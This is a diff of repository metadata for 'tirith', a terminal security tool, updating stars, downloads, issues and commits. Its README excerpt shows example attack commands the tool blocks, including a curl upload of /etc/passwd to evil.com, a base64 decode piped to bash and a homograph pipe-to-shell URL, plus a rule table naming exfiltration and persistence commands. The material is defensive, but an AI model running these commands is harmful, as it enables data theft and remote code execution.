@@ -185,6 +185,11 @@
       "date": "2026-09-22",
       "stars": 2735,
       "forks": 97
+    },
+    {
+      "date": "2026-09-24",
+      "stars": 2735,
+      "forks": 97
     }
   ],
   "trendingHistory": [
@@ -312,12 +317,12 @@
   "stars": 2735,
   "forks": 97,
   "watchers": 6,
-  "openIssues": 15,
+  "openIssues": 16,
   "createdAt": "2026-02-02T04:33:47Z",
-  "pushedAt": "2026-09-21T10:16:16Z",
+  "pushedAt": "2026-09-24T09:22:19Z",
   "defaultBranch": "main",
   "archived": false,
-  "updatedAt": "2026-09-22T00:30:27.017Z",
+  "updatedAt": "2026-09-24T19:43:54.543Z",
   "languages": {
     "Rust": 23901040,
     "Shell": 424262,
@@ -342,11 +347,11 @@
       "login": "github-actions[bot]",
       "url": "https://github.com/apps/github-actions",
       "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4",
-      "contributions": 123
+      "contributions": 136
     }
   ],
   "readmeExcerpt": "# tirith\n\n**Your browser would catch this. Your terminal won't.**\n\n<p align=\"center\">\n  <img src=\"assets/cover.png\" alt=\"tirith, terminal security\" width=\"100%\" />\n</p>\n\n\n\n\n\n[Website](https://tirith.sh) | [Docs](https://tirith.sh/docs) | [SKILL.md](SKILL.md) | [Changelog](CHANGELOG.md) | [Releases](https://github.com/sheeki03/tirith/releases)\n\n<a href=\"https://vercel.com/open-source-program\">\n  <img alt=\"Vercel OSS Program\" src=\"https://vercel.com/oss/program-badge-2026.svg\" />\n</a>\n\n<sub>Independent open-source project, with hosting supported by the Vercel Open Source Program (Spring 2026 Cohort).</sub>\n\n---\n\nCan you spot the difference?\n\n```\n  curl -sSL https://install.example-cli.dev | bash     # safe\n  curl -sSL https://іnstall.example-clі.dev | bash     # compromised\n```\n\nYou can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.\n\nBrowsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question. AI agents run shell commands and install packages without inspecting what's inside.\n\n**Tirith stands at the gate.** It intercepts commands, pasted content, and scanned files for homograph URLs, obfuscated payloads, credential exfiltration, malicious AI skills/configs, and known-bad packages/domains/IPs from a signed threat intelligence database before they execute.\n\n```bash\nbrew install tirith\n```\n\nThen activate in your shell profile:\n\n```bash\n# zsh\neval \"$(tirith init --shell zsh)\"\n\n# bash\neval \"$(tirith init --shell bash)\"\n\n# fish\ntirith init --shell fish | source\n```\n\n> [!TIP]\n> `eval \"$(tirith init)\"` auto-detects your current shell (it inspects the parent process and falls back to `$SHELL` if needed). The explicit `--shell` flag is only required when you want to override the detection.\n\nThat's it for interactive-shell coverage. Commands accepted by that shell are\nchecked while the hook is loaded and healthy; exact blocking behavior depends\non the shell and mode. Run `tirith doctor` after installation and upgrades, and\nread [enforcement by shell](#enforcement-by-shell) before treating the hook as\nan authorization boundary. Clean commands stay silent and normally take the\nfast path.\n\nAlso available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).\n\n---\n\n## See it work\n\n**Homograph attack, blocked before execution:**\n\n```\n$ curl -sSL https://іnstall.example-clі.dev | bash\n\ntirith: BLOCKED\n  [CRITICAL] non_ascii_hostname, Cyrillic і (U+0456) in hostname\n    This is a homograph attack. The URL visually mimics a legitimate\n    domain but resolves to a completely different server.\n  Bypass: prefix your command with TIRITH=0 (applies to that command only)\n```\n\nThe command never executes.\n\n**Pipe-to-shell with clean URL, warned, not blocked:**\n\n```\n$ curl -fsSL https://get.docker.com | sh\n\ntirith: WARNING\n  [MEDIUM] pipe_to_interpreter, Download piped to interpreter\n    Consider downloading first and reviewing.\n```\n\nWarning prints to stderr. Command still runs.\n\n**Base64 decode-execute chain, blocked:**\n\n```\n$ echo payload | base64 -d | bash\n\ntirith: BLOCKED\n  [HIGH] base64_decode_execute, Base64 decode piped to interpreter\n  [HIGH] pipe_to_interpreter, Pipe to interpreter: base64 | bash\n```\n\nCatches decode chains through sudo/env wrappers and PowerShell `-EncodedCommand` too.\n\n**Credential exfiltration, blocked:**\n\n```\n$ curl -d @/etc/passwd https://evil.com/collect\n\ntirith: BLOCKED\n  [HIGH] data_exfiltration, Data exfiltration via curl upload\n    curl command uploads sensitive data to a remote server\n```\n\nCovers all curl/wget upload flags, env vars (`$AWS_SECRET_ACCESS_KEY`), and command substitution.\n\n**Malicious skill file, caught on scan:**\n\n```\n$ tirith scan evil_skill.py\n\ntirith scan: evil_skill.py, 3 finding(s)\n  [MEDIUM] dynamic_code_execution, exec() near b64decode() in close proximity\n  [MEDIUM] obfuscated_payload, Long base64 string decoded and executed\n  [MEDIUM] suspicious_code_exfiltration, HTTP call passes sensitive data as argument\n```\n\nScans JS/Python files for obfuscated payloads, dynamic code execution, and secret exfiltration patterns.\n\n**Normal commands, invisible:**\n\n```\n$ git status\n$ ls -la\n$ docker compose up -d\n```\n\nNothing. Zero output. You forget tirith is running.\n\n---\n\n## What it catches\n\n**244 detection rules across 35 categories.**\n\n| Category | What it stops |\n|----------|--------------|\n| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels, lookalike TLDs, confusable domains, text-level confusable detection (math alphanumerics, same-word mixed-script) |\n| **Terminal injection** | ANSI escape sequences, bidi overrides, zero-width characters, unicode tags, invisible math operators, variation selectors, Hangul fillers |\n| **Steganography defense** | Invisible whitespace encoding (12 Unicode space variants), Mongolian Vowel Separator, Hangul Filler characters, math alphanumeric substitution, defenses against st3gg-style text steganography |\n| **Pipe-to-shell** | `curl \\| bash`, `wget \\| sh`, `httpie \\| sh`, `xh \\| sh`, `python <(curl ...)`, `eval $(wget ...)`, plus many wrapper, decode, and indirection paths |\n| **Base64 decode-execute** | `base64 -d \\| bash`, `python -c \"exec(b64decode(...))\"`, `powershell -EncodedCommand`, decode chains through sudo/env wrappers |\n| **Data exfiltration** | `curl -d @/etc/passwd`, `curl -T ~/.ssh/id_rsa`, `wget --post-file`, env var uploads (`$AWS_SECRET_ACCESS_KEY`), command substitution exfil |\n| **Code file scanning** | Obfuscated payloads (`eval(atob(...))`), dynamic code execution (`exec(b64decode(...))`), secret exfiltration via `fetch`/`requests.post` in JS/Python files |\n| **Credential detection** | AWS keys, GitHub PATs, Stripe/Slack/SendGrid/Anthropic/GCP/npm tokens, private key blocks, plus entropy-based generic secret detection |\n| **Post-compromise behavior** | Process memory scraping (`/proc/*/mem`), Docker remote privilege escalation, credential file sweeps, calibrated against TeamPCP and UNC1069 post-compromise tooling |\n| **Command safety** | Dotfile overwrites, archive extraction to sensitive paths, cloud metadata endpoint access, private network access |\n| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification, shortened URLs hiding destinations |\n| **Environment** | Proxy hijacking, sensitive env exports, code injection via env, interpreter hijack, shell injection env |\n| **Config file security** | Config injection, suspicious indicators, non-ASCII/invisible unicode in configs, MCP server security (insecure/untrusted/duplicate/permissive) |\n| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs, web3 RPC endpoints, vet-not-configured |\n| **Install-command safety** | APT repos added from a piped download, `[trusted=yes]` / `--allow-unauthenticated` / `--nogpgcheck` / pacman `SigLevel = Never` (disabled signature checks), `kubectl apply -f` against raw/shortened remote manifests, Helm charts from untrusted repos, Terraform modules from untrusted remote sources, `brew install`/`tap` from arbitrary URLs |\n| **Path analysis** | Non-ASCII paths, homoglyphs in paths, double-encoding |\n| **Rendered content** | Hidden CSS/color content, hidden HTML attributes, comment content analysis (prompt injection at High, destructive commands at Medium) |\n| **Cloaking detection** | Server-side cloaking (bot vs browser), clipboard hidden content, PDF hidden text |\n| **Windows / PowerShell** | `Set-ExecutionPolicy Bypass` / `-ep`, Windows Defender exclusions (`Add-MpPreference -Exclusion*`), inline `iex (iwr ...)` download-execute |\n| **Terminal output defense** | OSC 52 clipboard writes, fake prompts, OSC 8 hyperlink and title / clear-screen manipulation, prompt injection inside command or MCP tool output (scanned both raw and deobfuscated, so invisible-character, confusable, spaced-out, leetspeak, and short base64 / hex evasions are caught too), and output data exfiltration (beacon URLs or \"read a secret then send it\" directives) |\n| **Operational context** | Destructive commands against labeled-prod cloud / k8s contexts and SSH hosts, Terraform / Pulumi / OpenTofu `apply` without a matching saved plan, risky sudo escalation, privileged `docker run` |\n| **Workstation & persistence** | Loose-permission credential files and plaintext tokens (`~/.ssh`, `~/.aws`, `.npmrc`), persistence footholds (shell rc, `authorized_keys`, crontab, LaunchAgents, git `core.hooksPath`), PATH-hijack ordering, executable provenance, risky aliases, and sensitive env-var lifecycle |\n| **Blast radius & correlation** | Deletes that escape the repo, mass deletions, executing files downloaded from risky sources, and session chains such as secret-write then network or delete then `git push --force` |\n| **Trust, attestation & provenance** | Signed command-card mismatch, canary honeytoken touches, paste source-host mismatch, caller-origin (agent) policy denials, MCP lockfile drift, and AI-config drift versus a known-safe snapshot |\n| **Web3 command guard** | On-chain writes from Cast / Forge / Hardhat / Solana / Anchor commands (High when the same command also disables a declared safety control), raw private-key, keypair, or mnemonic material on the command line, and an RPC endpoint or signer the operator's `web3_guard` policy does not trust. Grammar and policy only: no chain state is read, no transaction is simulated, and no address is scored |\n| **Wallet exfiltration** | Reviewed wallet, keystore, browser-wallet, and Solana-keypair material flowing to a proven remote sink, including archive, base64, hex, compressor, and encryptor staging hops and `xargs` / `find -exec` operand promotion. A source-only read is deliberately not a finding |\n| **CI artifact poisoning** | A fork-reachable workflow that uploads a build artifact, consumed by a privileged `workflow_run` workflow bound to the triggering run that then executes, sources, PATH-mutates, publishes, or deploys it |\n\n---\n\n## What tirith does NOT protect against\n\nTirith analyzes the **structure** of commands, pasted text, and files before\nthey execute. It is a pre-execution gate, not a runtime defense, and does not\ncover:\n\n- **General runtime sandboxing:** ordinary shell hooks and `tirith check` warn\n  or block; they do not isolate a command after launch. The explicit\n  `capsule run --preset untrusted-project` and enforcing `pkg install` paths\n  provide fail-closed containment only on supported x86_64 Linux hosts.\n- **Post-execution network monitoring:** what a process does on the network after\n  launch is out of scope.\n- **General malware / payload detection:** tirith is not an antivirus and does\n  not detonate a payload. It analyzes structure and can match exact indicators\n  and artifact/file hashes from the signed threat database, but an unknown\n  payload is not proven benign by the absence of a match. (`tirith run` checks\n  a downloaded script's structure; it is still not dynamic malware analysis.)\n- **A privileged root/admin attacker:** anyone already root or admin can bypass\n  tirith trivially. It defends against tricked input, not an attacker who already\n  owns the machine.\n- **Anti-debugging / anti-tampering:** tirith does not resist reverse engineering\n  or protect its own binary from a local attacker.\n- **On-chain analysis:** the Web3 guard reads command grammar. It does not read\n  chain state, simulate a transaction, resolve ENS, score an address, audit a\n  contract, or watch a mempool.\n- **An npm artifact firewall:** tirith parses npm command grammar and registry\n  identity facts, and can ask the project's own npm for its signature and\n  provenance state. It does not download, extract, quarantine, or bind the\n  tarball bytes npm installs. The contained, hash-pinned artifact firewall is\n  Python-only.\n-",
-  "commitCount": 2611,
+  "commitCount": 2624,
   "contributorCount": 2,
   "releases": [
     {
@@ -356,7 +361,7 @@
       "publishedAt": "2026-09-11T16:41:40Z",
       "prerelease": false,
       "body": "# Tirith 0.4.2 release notes\n\nTirith 0.4.2 is a reliability and performance patch for the 0.4 line. It fixes\nshell integration failures and ordinary-command false positives, restores\nreliable ThreatDB publication and reloads, and reduces repeated work in command\nanalysis and diagnostics. It adds no top-level command.\n\nThe [0.4.0 release notes](https://github.com/sheeki03/tirith/blob/v0.4.2/docs/release-notes-0.4.0.md) describe the feature set and\nplatform boundaries; the [0.4.1 release notes](https://github.com/sheeki03/tirith/blob/v0.4.2/docs/release-notes-0.4.1.md) explain\nthe Bash enter-mode behavior introduced by that release.\n\n## Shells and everyday commands\n\n- **NixOS and non-FHS installations:** hooks resolve and pin trusted helper\n  executables instead of assuming `/usr/bin` and `/bin` contain them. Ordinary\n  commands are no longer discarded because those helper paths are absent\n  ([#239](https://github.com/sheeki03/tirith/issues/239)).\n- **npm installations:** on Unix, initialization binds Bash, zsh, and fish\n  hooks to the running native Tirith executable. The Node launcher no longer\n  sits between the shell and receipt registration. Other platforms retain\n  shell PATH r",
-      "downloads": 73195,
+      "downloads": 1643100,
       "reactions": 3
     },
     {
@@ -366,7 +371,7 @@
       "publishedAt": "2026-09-02T05:01:58Z",
       "prerelease": false,
       "body": "# Tirith 0.4.1 release notes\n\nTirith 0.4.1 is a patch release on the 0.4 line. It changes no schema, adds no\ncommand, and removes nothing. The [0.4.0 release\nnotes](release-notes-0.4.0.md) remain the description of what the 0.4 line\ndoes; this document covers what 0.4.1 changes on top of it.\n\nOne item here is a real behaviour change rather than a fix in the usual sense:\nbash now blocks. Read that section before upgrading a bash workstation.\n\n## The headline: bash actually blocks now\n\nIn 0.4.0 and every release before it, bash enter mode could not deliver a\ncommand. A bare `bind -x` on Enter runs the bound function but does not then\naccept the line on stock bash, so the hook captured the typed command and then\ndropped it. The capability self-test detected exactly that and correctly\nrefused to enable enter mode, which is why 0.4.0 was safe. The cost was that\nevery bash user fell back to warn-only preexec, and the only way to get real\nblocking on bash was `TIRITH_BASH_PREEXEC_ENFORCE=1`. Issues #111 and #224.\n\n0.4.1 binds Enter to a readline macro instead: the macro runs the checker and\nthen a guarded accept-line whose accept half is a no-op until the checker arms\nit. The prompt hook ",
-      "downloads": 1146243,
+      "downloads": 1146974,
       "reactions": 0
     },
     {
@@ -376,7 +381,7 @@
       "publishedAt": "2026-08-25T19:06:30Z",
       "prerelease": false,
       "body": "# Tirith 0.4.0 release notes\n\nReleased 2026-08-25. This release integrates the work merged after 0.3.3 and\npublishes it through Tirith's protected, single-use release pipeline.\n\n## Why 0.4.0\n\nThis is a new minor release rather than a 0.3.4 patch. It adds major public\ncapabilities, commands, policy sections, document schemas, agent integrations,\nand platform-specific enforcement boundaries. `0.4.0` communicates that scope\nwithout skipping an unused 0.4 line. The project remains pre-1.0, so callers\nshould read the compatibility notes below before upgrading.\n\n## Release highlights\n\n### Python artifact inspection and package firewall\n\n- Version intent preserves exact pins, ranges, compatible constraints,\n  exclusions, and unresolved requirements through package threat assessment\n  instead of flattening them to a package name.\n- `tirith package inspect` analyzes wheel files, sets of wheels, or installed\n  environments without downloading them.\n- A bounded streaming wheel reader rejects traversal, collisions, encrypted\n  entries, conflicting distribution metadata, CRC failures, decompression\n  abuse, and ambiguous identities.\n- Wheel RECORD and installed-environment RECORD verification d",
-      "downloads": 884604,
+      "downloads": 884761,
       "reactions": 0
     },
     {
@@ -386,7 +391,7 @@
       "publishedAt": "2026-08-25T20:49:01Z",
       "prerelease": true,
       "body": "Auto-updated threat-intelligence database (prerelease channel). Not a versioned download; tirith resolves it via the signed manifest. See #140.",
-      "downloads": 64891,
+      "downloads": 169410,
       "reactions": 0
     },
     {
@@ -396,19 +401,11 @@
       "publishedAt": "2026-06-19T06:07:03Z",
       "prerelease": false,
       "body": "## What's Changed\n* State-file hardening, crash-atomic writes, and tier-1 test isolation by @sheeki03 in https://github.com/sheeki03/tirith/pull/145\n* Prompt-injection evasion resistance, output exfil detection, and policy-loadable seeds by @sheeki03 in https://github.com/sheeki03/tirith/pull/147\n* ci: pin all GitHub Actions to commit SHAs + add Dependabot by @sheeki03 in https://github.com/sheeki03/tirith/pull/148\n\n\n**Full Changelog**: https://github.com/sheeki03/tirith/compare/v0.3.2...v0.3.3",
-      "downloads": 8301236,
+      "downloads": 8305637,
       "reactions": 0
     }
   ],
   "commitActivity": [
-    {
-      "week": "2025-09-13",
-      "commits": 0
-    },
-    {
-      "week": "2025-09-20",
-      "commits": 0
-    },
     {
       "week": "2025-09-27",
       "commits": 0
@@ -607,66 +604,18 @@
     },
     {
       "week": "2026-09-06",
-      "commits": 14
+      "commits": 15
+    },
+    {
+      "week": "2026-09-13",
+      "commits": 7
+    },
+    {
+      "week": "2026-09-20",
+      "commits": 5
     }
   ],
   "contributionDays": [
-    {
-      "date": "2025-09-13",
-      "count": 0
-    },
-    {
-      "date": "2025-09-14",
-      "count": 0
-    },
-    {
-      "date": "2025-09-15",
-      "count": 0
-    },
-    {
-      "date": "2025-09-16",
-      "count": 0
-    },
-    {
-      "date": "2025-09-17",
-      "count": 0
-    },
-    {
-      "date": "2025-09-18",
-      "count": 0
-    },
-    {
-      "date": "2025-09-19",
-      "count": 0
-    },
-    {
-      "date": "2025-09-20",
-      "count": 0
-    },
-    {
-      "date": "2025-09-21",
-      "count": 0
-    },
-    {
-      "date": "2025-09-22",
-      "count": 0
-    },
-    {
-      "date": "2025-09-23",
-      "count": 0
-    },
-    {
-      "date": "2025-09-24",
-      "count": 0
-    },
-    {
-      "date": "2025-09-25",
-      "count": 0
-    },
-    {
-      "date": "2025-09-26",
-      "count": 0
-    },
     {
       "date": "2025-09-27",
       "count": 0
@@ -2065,6 +2014,62 @@
     },
     {
       "date": "2026-09-12",
+      "count": 1
+    },
+    {
+      "date": "2026-09-13",
+      "count": 1
+    },
+    {
+      "date": "2026-09-14",
+      "count": 1
+    },
+    {
+      "date": "2026-09-15",
+      "count": 1
+    },
+    {
+      "date": "2026-09-16",
+      "count": 1
+    },
+    {
+      "date": "2026-09-17",
+      "count": 1
+    },
+    {
+      "date": "2026-09-18",
+      "count": 1
+    },
+    {
+      "date": "2026-09-19",
+      "count": 1
+    },
+    {
+      "date": "2026-09-20",
+      "count": 1
+    },
+    {
+      "date": "2026-09-21",
+      "count": 1
+    },
+    {
+      "date": "2026-09-22",
+      "count": 1
+    },
+    {
+      "date": "2026-09-23",
+      "count": 1
+    },
+    {
+      "date": "2026-09-24",
+      "count": 1
+    },
+    {
+      "date": "2026-09-25",
+      "count": 0
+    },
+    {
+      "date": "2026-09-26",
       "count": 0
     }
   ],
@@ -2072,13 +2077,58 @@
   "firstCommitAt": "2026-02-02T04:31:31Z",
   "recentIssues": [
     {
-      "number": 249,
-      "title": "Why is the deb requiring sudo?",
-      "url": "https://github.com/sheeki03/tirith/issues/249",
-      "createdAt": "2026-09-12T04:26:52Z",
+      "number": 265,
+      "title": "fish hook leaks umask 077 into the interactive shell",
+      "url": "https://github.com/sheeki03/tirith/issues/265",
+      "createdAt": "2026-09-22T08:06:49Z",
       "comments": 0,
       "labels": [],
-      "author": "mroark1m"
+      "author": "Cito"
+    },
+    {
+      "number": 264,
+      "title": "0.4.2 blocks ordinary commands 0.3.3 allowed: variable indirection and pipe into 'python3 -c'",
+      "url": "https://github.com/sheeki03/tirith/issues/264",
+      "createdAt": "2026-09-19T03:29:38Z",
+      "comments": 0,
+      "labels": [],
+      "author": "jofrebbarros-cmyk"
+    },
+    {
+      "number": 261,
+      "title": "tirith v0.4.2 does not build or run on Android/Termux (aarch64, Bionic): arboard has no Android backend; libc::__errno_location is glibc-only",
+      "url": "https://github.com/sheeki03/tirith/issues/261",
+      "createdAt": "2026-09-18T23:47:19Z",
+      "comments": 0,
+      "labels": [],
+      "author": "uspourmirza-boop"
+    },
+    {
+      "number": 260,
+      "title": "False positive: `if [ … ]; then …; fi` and `$( )`-in-`$(( ))` blocked as analysis_incomplete (regression class from #235–#237, partially fixed in 0.4.2)",
+      "url": "https://github.com/sheeki03/tirith/issues/260",
+      "createdAt": "2026-09-17T19:50:14Z",
+      "comments": 0,
+      "labels": [],
+      "author": "ggallen"
+    },
+    {
+      "number": 257,
+      "title": "zsh: concurrent shells sharing an inherited TIRITH_SESSION_ID lose the receipt generation race and remain locked across retries (\"execution receipt remains unresolved\")",
+      "url": "https://github.com/sheeki03/tirith/issues/257",
+      "createdAt": "2026-09-13T10:22:40Z",
+      "comments": 0,
+      "labels": [],
+      "author": "gapul"
+    },
+    {
+      "number": 255,
+      "title": "curl URL-argument coercion: bare numeric tokens (including ports) parsed as int32 IPs — hallucinated raw_ip_url/schemeless_to_sink findings",
+      "url": "https://github.com/sheeki03/tirith/issues/255",
+      "createdAt": "2026-09-12T16:25:40Z",
+      "comments": 0,
+      "labels": [],
+      "author": "zerodeity"
     }
   ],
   "punchCard": [
@@ -2130,7 +2180,7 @@
     {
       "day": 0,
       "hour": 9,
-      "commits": 2
+      "commits": 4
     },
     {
       "day": 0,
@@ -2250,7 +2300,7 @@
     {
       "day": 1,
       "hour": 9,
-      "commits": 8
+      "commits": 10
     },
     {
       "day": 1,
@@ -2370,7 +2420,7 @@
     {
       "day": 2,
       "hour": 9,
-      "commits": 3
+      "commits": 5
     },
     {
       "day": 2,
@@ -2490,7 +2540,7 @@
     {
       "day": 3,
       "hour": 9,
-      "commits": 9
+      "commits": 11
     },
     {
       "day": 3,
@@ -2610,7 +2660,7 @@
     {
       "day": 4,
       "hour": 9,
-      "commits": 4
+      "commits": 6
     },
     {
       "day": 4,
@@ -2730,7 +2780,7 @@
     {
       "day": 5,
       "hour": 9,
-      "commits": 1
+      "commits": 2
     },
     {
       "day": 5,
@@ -2845,7 +2895,7 @@
     {
       "day": 6,
       "hour": 8,
-      "commits": 5
+      "commits": 7
     },
     {
       "day": 6,
@@ -2924,88 +2974,88 @@
     }
   ],
   "participation": {
-    "all": 2611,
+    "all": 2623,
     "owner": 2488,
-    "community": 123
+    "community": 135
   },
   "recentCommits": [
     {
-      "sha": "7fd3510",
-      "message": "docs: pin the GitHub Action example to version 0.4.2",
-      "url": "https://github.com/sheeki03/tirith/commit/7fd35101568bb06ee0d361dc1d4a4d193c5f60fd",
-      "date": "2026-09-11T16:12:27Z",
-      "author": "sheeki03",
-      "avatarUrl": "https://avatars.githubusercontent.com/u/36009418?v=4"
-    },
-    {
-      "sha": "6243bb7",
-      "message": "chore: update threatdb manifest to v1789141502929",
-      "url": "https://github.com/sheeki03/tirith/commit/6243bb7e9770122583d76eee8f0ab7229735b09a",
-      "date": "2026-09-11T15:45:24Z",
+      "sha": "c18753a",
+      "message": "chore: update threatdb manifest to v1790241713311",
+      "url": "https://github.com/sheeki03/tirith/commit/c18753adae52baa0bdc8a0d2eb1ec167142390c1",
+      "date": "2026-09-24T09:22:17Z",
       "author": "github-actions[bot]",
       "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
     },
     {
-      "sha": "0e3bd83",
-      "message": "chore: update threatdb manifest to v1789141000705",
-      "url": "https://github.com/sheeki03/tirith/commit/0e3bd83727e5c062786897b46d88933cde7a11e7",
-      "date": "2026-09-11T15:37:01Z",
+      "sha": "1184b75",
+      "message": "chore: update threatdb manifest to v1790155304880",
+      "url": "https://github.com/sheeki03/tirith/commit/1184b75027c1c436be262eb3e45a3e6389333166",
+      "date": "2026-09-23T09:22:05Z",
       "author": "github-actions[bot]",
       "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
     },
     {
-      "sha": "9c903ad",
-      "message": "Release 0.4.2",
-      "url": "https://github.com/sheeki03/tirith/commit/9c903ad65914d33be30e1b40e560b3e59349c225",
-      "date": "2026-09-11T15:37:07Z",
-      "author": "sheeki03",
-      "avatarUrl": "https://avatars.githubusercontent.com/u/36009418?v=4"
-    },
-    {
-      "sha": "9f2c652",
-      "message": "Fix shell receipt activation, database reloads, and costly runtime paths (#246)",
-      "url": "https://github.com/sheeki03/tirith/commit/9f2c652a8378ac78913fadfca7a4960397b33047",
-      "date": "2026-09-11T14:21:36Z",
-      "author": "sheeki03",
-      "avatarUrl": "https://avatars.githubusercontent.com/u/36009418?v=4"
-    },
-    {
-      "sha": "d729bee",
-      "message": "chore: update threatdb manifest to v1789127333980",
-      "url": "https://github.com/sheeki03/tirith/commit/d729beeb37a5de4585f4a879a8a67c41842e9b58",
-      "date": "2026-09-11T11:49:14Z",
+      "sha": "6ad6cf2",
+      "message": "chore: update threatdb manifest to v1790068908241",
+      "url": "https://github.com/sheeki03/tirith/commit/6ad6cf244d28713b23b29b10f2b8db462d2acd8c",
+      "date": "2026-09-22T09:22:09Z",
       "author": "github-actions[bot]",
       "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
     },
     {
-      "sha": "db50713",
-      "message": "fix: compare ThreatDB source timestamps by instant (#244)",
-      "url": "https://github.com/sheeki03/tirith/commit/db50713b8f0fc082111c62ffe399d6313516a932",
-      "date": "2026-09-11T11:43:10Z",
-      "author": "sheeki03",
-      "avatarUrl": "https://avatars.githubusercontent.com/u/36009418?v=4"
-    },
-    {
-      "sha": "7eb561e",
-      "message": "chore: update threatdb manifest to v1789125938987",
-      "url": "https://github.com/sheeki03/tirith/commit/7eb561e6e1824e31235d2d6a2a42ceb72e7639a1",
-      "date": "2026-09-11T11:25:59Z",
+      "sha": "502e9bc",
+      "message": "chore: update threatdb manifest to v1789984707520",
+      "url": "https://github.com/sheeki03/tirith/commit/502e9bc3ce3b309bc25b44cc678f14847ef7fe01",
+      "date": "2026-09-21T09:58:48Z",
       "author": "github-actions[bot]",
       "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
     },
     {
-      "sha": "8b5fce3",
-      "message": "Fix ThreatDB publishing failures and 0.4.1 shell regressions (#243)",
-      "url": "https://github.com/sheeki03/tirith/commit/8b5fce331191732608597c0bc48d5e86381af37b",
-      "date": "2026-09-11T11:20:37Z",
-      "author": "sheeki03",
-      "avatarUrl": "https://avatars.githubusercontent.com/u/36009418?v=4"
+      "sha": "800ffb3",
+      "message": "chore: update threatdb manifest to v1789896030343",
+      "url": "https://github.com/sheeki03/tirith/commit/800ffb3b6c49f52cb391d7e27dc092331fefc4ad",
+      "date": "2026-09-20T09:20:50Z",
+      "author": "github-actions[bot]",
+      "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
     },
     {
-      "sha": "1a196d3",
-      "message": "chore: update threatdb manifest to v1789030774785",
-      "url": "https://github.com/sheeki03/tirith/commit/1a196d3d8fc6669fe537783c9b3d6f1be220ae58",
-      "date": "2026-09-10T08:59:59Z",
+      "sha": "e4b70b7",
+      "message": "chore: update threatdb manifest to v1789807895790",
+      "url": "https://github.com/sheeki03/tirith/commit/e4b70b76633184edaaa5cab9408c1ec6690f6023",
+      "date": "2026-09-19T08:51:59Z",
+      "author": "github-actions[bot]",
+      "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
+    },
+    {
+      "sha": "34ffc5b",
+      "message": "chore: update threatdb manifest to v1789722205093",
+      "url": "https://github.com/sheeki03/tirith/commit/34ffc5be3d795513e1c3a883e3014e3c9721296e",
+      "date": "2026-09-18T09:03:45Z",
+      "author": "github-actions[bot]",
+      "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
+    },
+    {
+      "sha": "9e47e70",
+      "message": "chore: update threatdb manifest to v1789637443691",
+      "url": "https://github.com/sheeki03/tirith/commit/9e47e705b34a22b8d8a287f54408812c09de727d",
+      "date": "2026-09-17T09:31:08Z",
+      "author": "github-actions[bot]",
+      "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
+    },
+    {
+      "sha": "80f2b2e",
+      "message": "chore: update threatdb manifest to v1789550514532",
+      "url": "https://github.com/sheeki03/tirith/commit/80f2b2e2304dbc5fc2741a80e4cbeedb2015b725",
+      "date": "2026-09-16T09:22:16Z",
+      "author": "github-actions[bot]",
+      "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
+    },
+    {
+      "sha": "9bfc275",
+      "message": "chore: update threatdb manifest to v1789464468231",
+      "url": "https://github.com/sheeki03/tirith/commit/9bfc275ee6296a32881ca41df924060335b7c8e6",
+      "date": "2026-09-15T09:28:05Z",
       "author": "github-actions[bot]",
       "avatarUrl": "https://avatars.githubusercontent.com/in/15368?v=4"
     }
@@ -3246,111 +3296,111 @@
       "title": "chore(threatdb): refresh source pins",
       "url": "https://github.com/sheeki03/tirith/pull/253",
       "state": "open",
-      "updatedAt": "2026-09-12T07:27:19Z",
+      "updatedAt": "2026-09-24T07:53:24Z",
       "author": "github-actions[bot]",
       "draft": false
+    },
+    {
+      "number": 250,
+      "title": "Implement cycle controls, optional team policies and unprivileged defaults",
+      "url": "https://github.com/sheeki03/tirith/pull/250",
+      "state": "open",
+      "updatedAt": "2026-09-22T06:54:44Z",
+      "author": "sheeki03",
+      "draft": true
+    },
+    {
+      "number": 262,
+      "title": "portability: build and run on aarch64-linux-android (Bionic/Termux)",
+      "url": "https://github.com/sheeki03/tirith/pull/262",
+      "state": "open",
+      "updatedAt": "2026-09-18T23:54:58Z",
+      "author": "uspourmirza-boop",
+      "draft": false
+    },
+    {
+      "number": 259,
+      "title": "ci: bump github/codeql-action/upload-sarif from 4.37.9 to 4.38.0 in the github-actions group",
+      "url": "https://github.com/sheeki03/tirith/pull/259",
+      "state": "open",
+      "updatedAt": "2026-09-17T00:16:20Z",
+      "author": "dependabot[bot]",
+      "draft": false
+    },
+    {
+      "number": 258,
+      "title": "Isolate shell sessions and recover stale receipts promptly",
+      "url": "https://github.com/sheeki03/tirith/pull/258",
+      "state": "open",
+      "updatedAt": "2026-09-13T11:57:47Z",
+      "author": "sheeki03",
+      "draft": true
+    },
+    {
+      "number": 256,
+      "title": "Clarify curl numeric URL diagnostics and destination extraction",
+      "url": "https://github.com/sheeki03/tirith/pull/256",
+      "state": "open",
+      "updatedAt": "2026-09-13T07:52:25Z",
+      "author": "sheeki03",
+      "draft": true
+    },
+    {
+      "number": 254,
+      "title": "Disable unqualified private package input execution",
+      "url": "https://github.com/sheeki03/tirith/pull/254",
+      "state": "open",
+      "updatedAt": "2026-09-12T16:08:38Z",
+      "author": "sheeki03",
+      "draft": true
     },
     {
       "number": 252,
       "title": "fix(install): keep user-only installs and updates unprivileged",
       "url": "https://github.com/sheeki03/tirith/pull/252",
       "state": "open",
-      "updatedAt": "2026-09-12T07:23:47Z",
+      "updatedAt": "2026-09-12T08:40:09Z",
       "author": "sheeki03",
       "draft": true
-    },
-    {
-      "number": 251,
-      "title": "fix(packaging): make sudo optional for normal CLI use",
-      "url": "https://github.com/sheeki03/tirith/pull/251",
